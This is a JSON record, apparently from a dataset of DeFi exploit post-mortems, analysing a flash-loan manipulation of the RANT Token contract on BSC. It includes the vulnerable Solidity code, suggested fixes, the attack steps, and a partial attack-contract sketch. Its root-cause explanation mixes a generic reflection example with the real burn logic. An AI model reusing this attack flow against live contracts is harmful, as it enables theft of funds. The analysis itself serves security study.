@@ -1,0 +1,36 @@
+{
+ "id": "2025__2025-07-04_RANTToken_ReflectionManipulation",
+ "source_file": "2025/2025-07-04_RANTToken_ReflectionManipulation.md",
+ "title": "RANT Token — Reflection Token Manipulation Attack Analysis",
+ "date": "2025-07-04",
+ "protocol": "RANT Token",
+ "chain": "BSC",
+ "loss_raw": "~311.4 BNB",
+ "loss_usd": null,
+ "root_cause": "`_autoBurnLiquidityPairTokens()` is triggered on every non-pair transfer and calls `rant_center.updateAllAverage()` using the current LP balance; an attacker who holds a flash-loaned RANT position triggers this function while the LP balance reflects a manipulated state, skewing reward accounting in their favor",
+ "attack_tx": "0x2d9c1a00",
+ "vulnerable_contract": "0xc321ac21a07b3d593b269acdace69c3762ca2dd0",
+ "classes": [
+  "business-logic",
+  "defl-tax-token"
+ ],
+ "code_before": [
+  "❌ Vulnerable logic: reflection rewards are instantly settled proportional to instantaneous balance\ncontract RANTToken {\n    uint256 private _rTotal; // total reflection supply\n    mapping(address => uint256) private _rOwned; // reflection balances\n\n    function _transfer(address from, address to, uint256 amount) internal {\n        uint256 rAmount = amount * _getRate();\n        _rOwned[from] -= rAmount;\n        // Fee is reflected to all holders — monopolized when holding large amount via flash loan\n        _reflectFee(tFee);\n        _rOwned[to] += rAmount - rFee;\n    }\n\n    function _reflectFee(uint256 rFee) private {\n        _rTotal -= rFee; // total reflection decreases → each holder's proportional share increases\n    }\n}\n\n//",
+  "// SPDX-License-Identifier: MIT\n// File: contracts/TEST/RANT.sol\n// Source: BSCScan verified — 0xc321AC21A07B3d593B269AcdaCE69C3762CA2dd0 (BSC)\n\ncontract RANTToken is Context, ERC20 {\n    IRantCenter public rant_center; // external reward/accounting contract\n\n    // ❌ _transfer: calls _autoBurnLiquidityPairTokens() on EVERY non-pair transfer\n    function _transfer(\n        address sender,\n        address recipient,\n        uint256 amount\n    ) internal virtual override {\n        uint256 buyEarnSender    = rant_center.takeToken(sender);\n        uint256 buyEarnRecipient = rant_center.takeToken(recipient);\n        if (buyEarnSender > 0)    { super._transferAdd(sender, buyEarnSender); }\n        if (buyEarnRecipient > 0) { super._transferAdd(recipient, buyEarnRecipient); }\n\n        if (isPair[sender] || isPair[recipient]) {\n            // ... buy/sell/add-LP/remove-LP handling (no auto-burn here)\n        } else {\n            // ❌ Auto-burn is triggered on EVERY wallet-to-wallet transfer\n            if (!lockburn) {\n                _autoBurnLiquidityPairTokens(); // ❌ reads current LP balance → manipulable\n            }\n            if (!isWhiteList(sender) && !isWhiteList(recipient)) {\n                require(recipient == address(this), \"wrong address\");\n                if (!lockburn) { _sellBurnLiquidityPairTokens(amount); }\n                if (!center_sell) {\n                    center_sell = true;\n                    super._transfer(sender, address(rant_center), amount);\n                    rant_center.sell_rant(amount, sender);\n                    center_sell = false;\n                }\n            } else {\n                super._transfer(sender, recipient, amount);\n            }\n        }\n    }\n\n    // ❌ _autoBurnLiquidityPairTokens: reads LP balance and calls rant_center.updateAllAverage()\n    // Attacker triggers this while holding flash-loaned RANT — LP price is manipulated\n    function _autoBurnLiquidityPairTokens() internal isLock() returns (bool) {\n        uint256 liquidityPairBalance = this.balanceOf(uniswapPair); // ❌ reads current pair balance\n        // ...\n        uint256 amountToBurn = caculateBurnAmount(10000 - burnRate, 10000, getTimes() - burnTimes);\n        burnTimes = getTimes();\n        if (liquidityPairBalance > amountToBurn) {\n            super._transferSub(uniswapPair, amountToBurn);\n            rant_center.updateAllAverage(amountToBurn); // ❌ updates reward accounting with manipulated amount\n        }\n        IUniswapV2Pair(uniswapPair).sync(); // ❌ syncs pair at manipulated state\n        emit AutoNukeLP();\n        return true;\n    }\n}\n\ninterface IRantCenter {\n    function buyRant(address _user) external payable;\n    function updateAllAverage(uint256 _tokenAmount) external; // ❌ reward accounting updatable via _transfer\n    function takeToken(address account) external returns (uint256 tokenAmount);\n    function earnedToken(address account) external view returns (uint256);\n    function sell_rant(uint256 _amount, address _user) "
+ ],
+ "code_after": [
+  "✅ Fix: flash loan detection or holding-period-based reward calculation\nmodifier noFlashLoan() {\n    require(tx.origin == msg.sender || isWhitelisted[msg.sender], \"No flash loan\");\n    _;\n}",
+  "// ✅ Fix: do not call _autoBurnLiquidityPairTokens() during flash-loan-detectable states;\n// at minimum, require that the LP balance has not changed in the same block\nmodifier noSameBurnBlock() {\n    require(block.number > lastBurnBlock, \"burn once per block\");\n    lastBurnBlock = block.number;\n    _;\n}\nfunction _autoBurnLiquidityPairTokens() internal isLock() noSameBurnBlock() returns (bool) {\n    // ... same logic but protected from same-block manipulation\n}"
+ ],
+ "steps": [
+  "1 ▶ PancakeSwap CAKE LP: swap(large RANT amount) [flash loan]",
+  "2 ▶ Attacker temporarily becomes largest RANT holder",
+  "3 ▶ Induces other transfer transactions on the network, or self-transfers",
+  "4 ▶ Repays all RANT (or swaps to BNB and retains profit)",
+  "5 ▶ Repays flash loan + ~311.4 BNB profit"
+ ],
+ "other_code": [
+  "Attacker\n  │\n  ├─1─▶ PancakeSwap CAKE LP: swap(large RANT amount) [flash loan]\n  │\n  ├─2─▶ Attacker temporarily becomes largest RANT holder\n  │         └─ Occupies high proportion relative to total supply\n  │\n  ├─3─▶ Induces other transfer transactions on the network, or self-transfers\n  │         └─ Monopolizes reflection rewards from transfer fees\n  │\n  ├─4─▶ Repays all RANT (or swaps to BNB and retains profit)\n  │\n  └─5─▶ Repays flash loan + ~311.4 BNB profit",
+  "// Core attack contract flow\nfunction attack() external {\n    // Step 1: Flash loan large amount of RANT from PancakeSwap\n    IPancakePair(CAKE_LP).swap(0, largeRantAmount, address(this), abi.encode(\"flash\"));\n}\n\nfunction pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {\n    // Step 2: Attacker holds large amount of RANT\n    // Reflection rewards accumulate automatically when network is active\n\n    // Step 3: Trigger reflection via small self-transfer\n    IERC20(RANT).transfer(address(0xdead), 1); // fee is incurred → reflection is received\n\n    // Step 4: Swap RANT to BNB to realize profit\n    IERC20(RANT).approve(PANCAKE_ROUTER, type(uint256).max);\n    address[] memory path = new address[](2);\n    path[0] = RANT; path[1] = wBNB;\n    IPancakeRou"
+ ]
+}
